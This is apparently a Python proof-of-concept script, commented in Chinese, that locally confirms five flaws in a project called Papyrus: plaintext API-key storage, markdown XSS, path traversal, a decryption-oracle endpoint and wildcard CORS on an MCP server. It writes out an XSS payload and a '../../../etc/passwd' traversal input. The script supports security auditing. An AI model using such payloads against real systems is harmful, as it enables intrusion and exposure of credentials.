"""
Papyrus Security PoC - Local Verification Script
验证以下漏洞:
1. 加密库缺失时 API Key 明文存储 (crypto.py)
2. Markdown 渲染 XSS (markdown-it html:true)
3. 资源路径遍历 (resources.py)
4. test-decrypt 端点 Oracle (providers.py)
5. MCP CORS * 行为模拟

运行方式:
    python security_poc.py
"""

import json
import os
import sys
import tempfile
from pathlib import Path

# 将项目 src 加入路径
PROJECT_ROOT = Path(__file__).parent
SRC = PROJECT_ROOT / "src"
sys.path.insert(0, str(SRC))


def banner(title: str) -> None:
    print("\n" + "=" * 60)
    print(f" {title}")
    print("=" * 60)


def poc_crypto_plaintext_fallback() -> None:
    """验证: 当 cryptography 不可用时，encrypt_api_key 回退到明文前缀"""
    banner("PoC 1: Crypto Plaintext Fallback")
    
    # 临时模拟 cryptography 不可用
    import papyrus.data.crypto as crypto_module
    original_crypto_available = crypto_module.CRYPTO_AVAILABLE
    
    try:
        crypto_module.CRYPTO_AVAILABLE = False
        result = crypto_module.encrypt_api_key("sk-secret-api-key-12345")
        print(f"[+] 加密结果: {result}")
        
        decrypted = crypto_module.decrypt_api_key(result)
        print(f"[+] 解密结果: {decrypted}")
        
        assert result == "plain:sk-secret-api-key-12345", "未按预期回退到明文前缀"
        assert decrypted == "sk-secret-api-key-12345", "解密未还原原始 key"
        print("[!] 漏洞确认: cryptography 缺失时 API Key 以完全明文存储!")
    finally:
        crypto_module.CRYPTO_AVAILABLE = original_crypto_available


def poc_markdown_xss() -> None:
    """验证: markdown-it 默认 html:true 会将 raw HTML 保留"""
    banner("PoC 2: Markdown XSS (backend router)")
    
    try:
        from markdown_it import MarkdownIt
    except ImportError:
        print("[-] 未安装 markdown-it-py，跳过此 PoC")
        return
    
    md = MarkdownIt()  # 默认 html=False 是安全的
    safe_html = md.render("<img src=x onerror=alert(1)>")
    print(f"[+] 默认配置 (html=False) 输出: {safe_html.strip()}")
    
    md_unsafe = MarkdownIt("default", {"html": True})  # 项目中的配置
    unsafe_html = md_unsafe.render("<img src=x onerror=alert(1)>")
    print(f"[+] 项目配置 (html=True) 输出: {unsafe_html.strip()}")
    
    if "onerror=alert(1)" in unsafe_html:
        print("[!] 漏洞确认: markdown-it html=True 保留了可执行 HTML!")
    else:
        print("[-] 未复现 XSS")


def poc_resource_path_traversal() -> None:
    """验证: resources.py 的 resource_path 可被 ../ 绕过"""
    banner("PoC 3: Resource Path Traversal")
    
    try:
        from papyrus.resources import resource_path
        from papyrus.resources import ASSETS_DIR
    except Exception as e:
        print(f"[-] 导入失败: {e}")
        return
    
    malicious_path = "../../../etc/passwd"
    result = resource_path(malicious_path)
    print(f"[+] ASSETS_DIR: {ASSETS_DIR}")
    print(f"[+] 输入: {malicious_path}")
    print(f"[+] 输出: {result}")
    
    # 在 Windows 上解析后检查
    resolved = Path(ASSETS_DIR) / malicious_path
    try:
        resolved = resolved.resolve()
    except Exception:
        pass
    
    if "etc" in str(resolved) or "passwd" in str(resolved):
        print("[!] 漏洞确认: 路径遍历可逃逸 ASSETS_DIR!")
    else:
        print("[-] 未检测到明显路径遍历")


def poc_test_decrypt_oracle() -> None:
    """验证: test-decrypt 端点接受任意加密字符串并返回明文"""
    banner("PoC 4: test-decrypt Oracle")
    
    try:
        from papyrus.data.crypto import encrypt_api_key, decrypt_api_key
    except Exception as e:
        print(f"[-] 导入失败: {e}")
        return
    
    secret = "sk-test-key-abcde"
    encrypted = encrypt_api_key(secret)
    decrypted = decrypt_api_key(encrypted)
    
    print(f"[+] 原始密钥: {secret}")
    print(f"[+] 加密结果: {encrypted}")
    print(f"[+] 解密结果: {decrypted}")
    
    # 模拟调用 test-decrypt 端点的逻辑
    def test_decrypt(encrypted_key: dict[str, str]) -> dict[str, str]:
        """src/papyrus_api/routers/providers.py:373-380 的简化复现"""
        try:
            decrypted = decrypt_api_key(encrypted_key.get("key", ""))
            return {"success": "True", "decrypted": decrypted}
        except Exception as e:
            return {"success": "False", "error": str(e)}
    
    response = test_decrypt({"key": encrypted})
    print(f"[+] test-decrypt 响应: {response}")
    
    if response.get("decrypted") == secret:
        print("[!] 漏洞确认: 任意加密字符串可通过 test-decrypt 还原为明文!")
    else:
        print("[-] 未复现 Oracle")


def poc_mcp_cors_behavior() -> None:
    """模拟 MCP 服务器的 CORS 响应行为"""
    banner("PoC 5: MCP CORS * Behavior")
    
    # src/mcp/server.py:59-64 的简化复现
    def mcp_send_json_headers() -> dict[str, str]:
        return {
            "Content-Type": "application/json; charset=utf-8",
            "Access-Control-Allow-Origin": "*",
        }
    
    headers = mcp_send_json_headers()
    print(f"[+] MCP 响应头: {headers}")
    
    if headers.get("Access-Control-Allow-Origin") == "*":
        print("[!] 漏洞确认: MCP 服务器返回 Access-Control-Allow-Origin: *")
        print("    任何网页都可以通过浏览器 fetch 跨域调用 MCP 工具!")
    else:
        print("[-] CORS 已受限")


def main() -> None:
    print("Papyrus Security PoC — 本地漏洞验证")
    print("项目路径:", PROJECT_ROOT)
    
    poc_crypto_plaintext_fallback()
    poc_markdown_xss()
    poc_resource_path_traversal()
    poc_test_decrypt_oracle()
    poc_mcp_cors_behavior()
    
    print("\n" + "=" * 60)
    print(" 所有 PoC 验证完成")
    print("=" * 60)


if __name__ == "__main__":
    main()
